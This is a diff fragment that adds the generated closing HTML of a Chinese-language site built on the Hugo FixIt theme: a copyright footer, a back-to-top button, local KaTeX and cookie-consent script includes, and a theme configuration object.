+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
